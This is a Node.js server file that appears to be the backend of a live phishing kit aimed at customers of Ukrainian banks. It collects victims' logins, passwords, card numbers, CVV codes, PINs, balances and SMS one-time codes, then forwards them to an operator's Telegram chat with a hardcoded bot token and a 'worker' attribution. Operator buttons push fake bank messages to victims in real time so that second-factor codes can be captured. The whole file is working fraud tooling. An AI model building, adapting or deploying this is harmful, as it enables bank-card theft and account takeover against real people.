const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// --- –ù–ê–°–¢–†–û–ô–ö–ò –ò–ó –ü–ï–†–ï–ú–ï–ù–ù–´–• –û–ö–†–£–ñ–ï–ù–ò–Ø ---
// 1. –¢–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
// 2. ID –≤–∞—à–µ–≥–æ —á–∞—Ç–∞ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
const CHAT_ID = process.env.CHAT_ID || '-4840920969';
// 3. –ü—É–±–ª–∏—á–Ω—ã–π URL –≤–∞—à–µ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ (—Ö–æ—Å—Ç–∏–Ω–≥–∞)
const PUBLIC_URL = process.env.PUBLIC_URL;

// –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ PUBLIC_URL –∑–∞–¥–∞–Ω, –∏–Ω–∞—á–µ –±–æ—Ç –Ω–µ —Å–º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —á–µ—Ä–µ–∑ –≤–µ–±—Ö—É–∫
if (!PUBLIC_URL) {
    console.error("–û—à–∏–±–∫–∞: –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è PUBLIC_URL –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. –°–µ—Ä–≤–µ—Ä –Ω–µ –º–æ–∂–µ—Ç –∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞.");
    process.exit(1); // –í—ã—Ö–æ–¥ –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –µ—Å–ª–∏ URL –Ω–µ —É–∫–∞–∑–∞–Ω
}

const WEBHOOK_URL = `${PUBLIC_URL}/bot${TELEGRAM_BOT_TOKEN}`;
// ------------------------------------------------

const banksForRequestButton = [
    '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω', '–ê–ª—å—è–Ω—Å', '–ü–£–ú–ë', 'OTP Bank',
    '–í–æ—Å—Ç–æ–∫', 'Izibank', '–£–∫—Ä—Å–∏–±'
];

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
app.get('/panel', (req, res) => { res.sendFile(path.join(__dirname, 'panel.html')); });

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞: ${WEBHOOK_URL}`);
}).catch(err => console.error('–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞:', err));

bot.sendMessage(CHAT_ID, 'üöÄ –ü–†–û–ï–ö–¢ –£–°–ü–ï–®–ù–û –ó–ê–ü–£–©–ï–ù–û –ù–ê –°–ï–†–í–ï–†–Ü! üöÄ\n–ì–∞—Ä–Ω–æ–≥–æ –≤–æ—Ä–∫—É! ‚úÖ', { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

bot.getMe().then(me => console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: @${me.username}`)).catch(err => console.error('Bot error:', err));

app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`–ö–ª–∏–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${data.sessionId}`);
            }
        } catch (e) { console.error('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('WebSocket error:', error));
});

app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) { console.error('–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è referrer:', e); }

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }
        sessions.set(sessionId, newData);

        let message = `<b>üî• –ù–æ–≤—ã–π –∑–∞–ø–∏—Å! üî•</b>\n\n`;
        message += `<b>üè¶ –ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n`;
        
        if (newData.login_type) {
            message += `<b>–¢–∏–ø –≤—Ö–æ–¥—É:</b> ${newData.login_type === 'phone' ? '–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É' : '–õ–æ–≥—ñ–Ω'}\n`;
            message += `<b>üì± –õ–æ–≥—ñ–Ω/–¢–µ–ª–µ—Ñ–æ–Ω:</b> <code>${newData.login_value}</code>\n`;
            message += `<b>üîí –ü–∞—Ä–æ–ª—å:</b> <code>${newData.password}</code>\n`;
        } else {
            message += `<b>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
            message += `<b>üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card_confirm || newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
            if (newData['card-expiry']) message += `<b>üóìÔ∏è –¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>${newData['card-expiry']}</code>\n`;
            if (newData['card-cvv']) message += `<b>üîë CVV:</b> <code>${newData['card-cvv']}</code>\n`;
            if (newData.pin) message += `<b>üî¢ –ü—ñ–Ω:</b> <code>${newData.pin}</code>\n`;
            if (newData.balance) message += `<b>üí∞ –ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>${newData.balance}</code>\n`;
        }
        
        const visitText = newData.visitCount === 1 ? '<b>NEW</b> ‚ú®' : `${newData.visitCount} —Ä–∞–∑`;
        message += `<b>üëÄ –ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n`;
        message += `<b>üë®‚Äçüíª Worker:</b> @${workerNick}\n`;
        message += `<b>üÜî –°–µ—Å—ñ—è:</b> <code>${sessionId}</code>`;

        sendToTelegram(message, sessionId, newData.bankName);
    }
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') { workerNick = atob(referrer); } }
    catch (e) { console.error('–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è referrer:', e); }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>üí¨ –û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n`;
        message += `<b>üî¢ –ö–æ–¥:</b> <code>${code}</code>\n`;
        message += `<b>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>üÜî –°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;
        message += `<b>üë®‚Äçüíª Worker:</b> @${workerNick}`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: '–î–û–î–ê–¢–û–ö', callback_data: `app:${sessionId}` }],
        [{ text: '–ü–Ü–ù ‚ùå', callback_data: `pin_error:${sessionId}` }, { text: '–ö–û–î ‚ùå', callback_data: `code_error:${sessionId}` }, { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` }],
        [{ text: '–ö–∞—Ä—Ç–∞ ‚ùå', callback_data: `card_error:${sessionId}` }, { text: '–ù–æ–º–µ—Ä ‚ùå', callback_data: `number_error:${sessionId}` }],
        [{ text: 'OTHER', callback_data: `other:${sessionId}` }]
    ];
    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: '–ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` });
    }
    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms': commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º –Ω–∞ –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É –≤–≤–æ–¥—É –∫–æ–¥—É" }; break;
            case 'app': commandData = { text: "–í–∞–º –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —É –¥–æ–¥–∞—Ç–æ–∫ –º–æ–±—ñ–ª—å–Ω–æ–≥–æ –±–∞–Ω–∫—É. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ –±–∞–Ω–∫—É —Ç–∞ –∑—Ä–æ–±—ñ—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –¥–ª—è –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó." }; break;
            case 'other': commandData = { text: "–í –Ω–∞—Å –Ω–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∞—à—É –∫–∞—Ä—Ç–∫—É. –î–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è –ø—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É" }; break;
            case 'pin_error': commandData = { text: "–í–∏ –≤–∫–∞–∑–∞–ª–∏ –Ω–µ–≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥" }; break;
            case 'card_error': commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ–≤—ñ—Ä–Ω–∏–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏ –≤—ñ—Ä–Ω–æ" }; break;
            case 'number_error': commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –Ω–æ–º–µ—Ä —è–∫–∏–π –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –≤–∞—à–æ—ó –∫–∞—Ä—Ç–∫–∏." }; break;
            case 'request_details': commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω' }; break;
        }
        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
    }
});

bot.on('polling_error', (error) => console.error('Telegram polling error:', error));
app.use((err, req, res, next) => { console.error('Server error:', err); res.status(500).json({ message: 'Internal Server Error' }); });

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});
